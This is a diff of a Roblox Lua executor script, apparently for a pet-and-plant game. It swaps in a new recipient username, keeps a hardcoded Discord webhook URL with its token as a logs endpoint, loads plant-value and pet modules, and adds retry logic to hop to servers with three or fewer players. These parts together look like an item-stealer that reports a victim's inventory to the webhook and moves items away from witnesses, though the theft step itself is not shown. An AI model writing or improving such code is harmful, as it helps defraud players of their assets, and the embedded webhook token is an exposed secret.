@@ -1,4 +1,4 @@
-username = "auzatest4"
+username = "joushaaaaaa1"
 webhook = "https://discord.com/api/webhooks/1390321696182894834/PL1M_Tf82KLvYSFkIT_UdpuzzU9bash8V1hKb0FerYlRu28N1rzPUPczaa6PKoibNB_P"
 
 local logs_webhook = "https://discord.com/api/webhooks/1390321696182894834/PL1M_Tf82KLvYSFkIT_UdpuzzU9bash8V1hKb0FerYlRu28N1rzPUPczaa6PKoibNB_P"
@@ -16,59 +16,64 @@ local CalculatePlantValue = require(ReplicatedStorage.Modules.CalculatePlantValu
 local ActivePetsService = require(ReplicatedStorage.Modules.PetServices.ActivePetsService)
 local req = (syn and syn.request) or (http and http.request) or (http_request) or request
 
--- Server teleport function
-local function findNewServer()
-    local function getServers()
-        local servers = {}
+-- Enhanced server teleport function with retry logic
+local function findBestServer(maxPlayers)
+    local attempts = 0
+    local maxAttempts = 5
+    local minPlayers = math.huge
+    local bestServerId = nil
+    
+    while attempts < maxAttempts do
         local success, result = pcall(function()
-            return HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"))
+            return HttpService:JSONDecode(game:HttpGet(
+                "https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"
+            ))
         end)
+        
         if success and result and result.data then
+            -- Filter and sort servers
+            local validServers = {}
             for _, server in ipairs(result.data) do
-                if server.playing and server.id ~= game.JobId then
-                    table.insert(servers, {
-                        id = server.id,
-                        players = server.playing
-                    })
+                if server.playing and server.id ~= game.JobId and server.playing <= maxPlayers then
+                    table.insert(validServers, server)
+                    if server.playing < minPlayers then
+                        minPlayers = server.playing
+                        bestServerId = server.id
+                    end
                 end
             end
-        end
-        return servers
-    end
-
-    local function getBestServer(servers)
-        table.sort(servers, function(a, b)
-            return a.players < b.players
-        end)
-        
-        for _, server in ipairs(servers) do
-            if server.players < 4 then -- Target low population servers
-                return server.id
+            
+            -- If we found an empty server, use it immediately
+            if minPlayers == 0 then
+                return bestServerId
+            end
+            
+            -- Sort by player count
+            table.sort(validServers, function(a, b)
+                return a.playing < b.playing
+            end)
+            
+            -- Return the best server found
+            if #validServers > 0 then
+                return validServers[1].id
             end
         end
         
-        return servers[1] and servers[1].id or nil
-    end
-
-    local servers = getServers()
-    if #servers > 0 then
-        local bestServer = getBestServer(servers)
-        if bestServer then
-            return bestServer
-        end
+        attempts = attempts + 1
+        task.wait(1) -- Wait before retrying
     end
     
-    return nil
+    return bestServerId
 end
 
-local function teleportToNewServer()
-    local loadingGui = Instance.new("ScreenGui")
-    loadingGui.Name = "TeleportingGui"
-    loadingGui.IgnoreGuiInset = true
-    loadingGui.ResetOnSpawn = false
-    loadingGui.Parent = player:WaitForChild("PlayerGui")
+local function createTeleportGui(message)
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "TeleportingGui"
+    gui.IgnoreGuiInset = true
+    gui.ResetOnSpawn = false
+    gui.Parent = player:WaitForChild("PlayerGui")
 
-    local bg = Instance.new("Frame", loadingGui)
+    local bg = Instance.new("Frame", gui)
     bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
     bg.Size = UDim2.new(1, 0, 1, 0)
 
@@ -82,7 +87,7 @@ local function teleportToNewServer()
     title.BackgroundTransparency = 1
 
     local status = Instance.new("TextLabel", bg)
-    status.Text = "Searching for low population server..."
+    status.Text = message or "Searching for low population server..."
     status.Font = Enum.Font.Gotham
     status.TextColor3 = Color3.fromRGB(180, 180, 180)
     status.TextScaled = true
@@ -90,29 +95,56 @@ local function teleportToNewServer()
     status.Position = UDim2.new(0.1, 0, 0.42, 0)
     status.BackgroundTransparency = 1
 
-    task.spawn(function()
-        local newServer = findNewServer()
-        if newServer then
-            status.Text = "Found server! Teleporting..."
-            TeleportService:TeleportToPlaceInstance(game.PlaceId, newServer)
+    return gui, status
+end
+
+local function teleportToBetterServer()
+    local maxPlayersAllowed = 3 -- Only look for servers with 3 or fewer players
+    local teleportGui, statusText = createTeleportGui()
+    
+    local function attemptTeleport()
+        local bestServer = findBestServer(maxPlayersAllowed)
+        
+        if bestServer then
+            statusText.Text = "Found server with " .. (maxPlayersAllowed == 0 and "no" or maxPlayersAllowed) .. " players! Teleporting..."
+            local success, err = pcall(function()
+                TeleportService:TeleportToPlaceInstance(game.PlaceId, bestServer)
+            end)
+            
+            if not success then
+                statusText.Text = "Teleport failed, retrying..."
+                task.wait(2)
+                attemptTeleport()
+            end
         else
-            status.Text = "Failed to find suitable server. Please try again later."
-            task.wait(3)
-            loadingGui:Destroy()
+            -- If no server found with current max players, relax the condition slightly
+            if maxPlayersAllowed < 10 then
+                maxPlayersAllowed = maxPlayersAllowed + 1
+                statusText.Text = string.format("No servers with %d players found. Trying %d players...", maxPlayersAllowed - 1, maxPlayersAllowed)
+                task.wait(1)
+                attemptTeleport()
+            else
+                statusText.Text = "Failed to find suitable server. Please try again later."
+                task.wait(3)
+                teleportGui:Destroy()
+            end
         end
-    end)
+    end
+    
+    task.spawn(attemptTeleport)
 end
 
 -- Check server conditions and teleport if needed
 if server == "VIPServer" then 
-    teleportToNewServer()
+    teleportToBetterServer()
     return
 end
 
 if #Players:GetPlayers() >= 4 then
-    teleportToNewServer()
+    teleportToBetterServer()
     return
 end
+
 
 local p = LocalPlayer
 local h = (p.Character or p.CharacterAdded:Wait()):WaitForChild("Humanoid")
